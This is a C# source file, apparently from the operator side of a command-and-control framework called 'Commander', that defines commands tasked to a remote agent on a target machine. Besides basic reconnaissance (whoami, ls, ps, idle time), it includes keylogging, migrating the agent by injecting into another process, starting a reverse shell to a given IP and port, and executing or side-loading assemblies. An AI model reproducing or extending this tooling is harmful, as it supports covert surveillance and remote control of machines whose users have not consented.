using Commander.Communication;
using Commander.Executor;
using Commander.Terminal;
using System;
using System.Collections.Generic;
using System.CommandLine;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Commander.Commands.Agent
{
    public abstract class EndPointCommand<T> : EnhancedCommand<T>
    {
        public static string WHOAMI = "whoami";
        public static string DOWNLOAD = "download";
        public static string UPLOAD = "upload";
        public static string LS = "ls";
        public static string PS = "ps";
        public static string PWD = "pwd";
        public static string TERMINATE = "terminate";

        public static string SHELL = "shell";
        public static string START = "start";
        public static string RUN = "run";

        public static string KEYLOG = "keylog";

        public static string EXECUTEASSEMBLY = "execute-assembly";
        public static string SIDELOAD = "side-load";

        public static string MIGRATE = "migrate";

        public static string VERSION = "version";
        public static string IDLE = "idle";

        public static string REVERSE_SHELL = "reverse-shell";

        public override string Category => CommandCategory.Core;

        public override RootCommand Command => new RootCommand(this.Description);

        protected async Task CallEndPointCommand(CommandContext context)
        {
            var agent = context.Executor.CurrentAgent;
            await context.CommModule.TaskAgent(context.CommandLabel, Guid.NewGuid().ToString(), agent.Metadata.Id, this.Name, context.CommandParameters);


            context.Terminal.WriteSuccess($"Command {this.Name} tasked to agent {agent.Metadata.Id}.");
        }

        protected override async Task<bool> HandleCommand(CommandContext<T> context)
        {
            await this.CallEndPointCommand(context);
            return true;
        }
    }


    public abstract class EndPointCommand : EndPointCommand<EmptyCommandOptions>
    {
    }

    public class WhoamiCommand : EndPointCommand
    {
        public override string Description => "Get User and Hostname where agent is running on";
        public override string Name => EndPointCommand.WHOAMI;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }

    public class PWDCommand : EndPointCommand
    {
        public override string Description => "Get current directory of the agent";
        public override string Name => EndPointCommand.PWD;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }

    public class VersionCommand : EndPointCommand
    {
        public override string Description => "Get Version of the agent";
        public override string Name => EndPointCommand.VERSION;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }

    public class IdleCommand : EndPointCommand
    {
        public override string Description => "Get The idle time of the target pc";
        public override string Name => EndPointCommand.IDLE;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }

    public class TerminateCommand : EndPointCommand
    {
        public override string Description => "Terminate the agent";
        public override string Name => EndPointCommand.TERMINATE;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;
    }


    public class LSCommandOptions
    {
        public string directory { get; set; }
    }
    public class LsCommand : EndPointCommand<LSCommandOptions>
    {
        public override string Description => "List files & folders in the current directory or selected directory";
        public override string Name => EndPointCommand.LS;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("directory", () => "", "directroy to list"),
            };
    }

    public class PSCommandOptions
    {
        public string process { get; set; }
    }
    public class PSCommand : EndPointCommand<PSCommandOptions>
    {
        public override string Description => "List processes";
        public override string Name => EndPointCommand.PS;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("process", () => "", "process name to search for"),
            };
    }


    public class KeylogCommandOptions
    {
        public bool verb { get; set; }
    }
    public class KeylogCommand : EndPointCommand<PSCommandOptions>
    {
        public override string Description => "Log keys on the agent";
        public override string Name => EndPointCommand.KEYLOG;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("verb", () => "start", "Start | Stop").FromAmong("start", "stop"),
            };
    }

    public class MigrateCommandOptions
    {
        public int processId { get; set; }
    }
    public class MigrateCommand : EndPointCommand<MigrateCommandOptions>
    {
        public override string Description => "Migrate the agent to an existing process";
        public override string Name => EndPointCommand.MIGRATE;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<int>("processId", "Id of the process to inject"),
            };
    }

    public class ReverseShellCommandOptions
    {
        public string Ip { get; set; }
        public int port { get; set; }
    }
    public class ReverseShellCommand : EndPointCommand<ReverseShellCommandOptions>
    {
        public override string Description => "Start a reverse shell";
        public override string Name => EndPointCommand.REVERSE_SHELL;
        public override ExecutorMode AvaliableIn => ExecutorMode.AgentInteraction;

        public override RootCommand Command => new RootCommand(this.Description)
            {
                new Argument<string>("Ip", "Ip to reach"),
                new Argument<int>("port", "port to reach"),
            };
    }



}
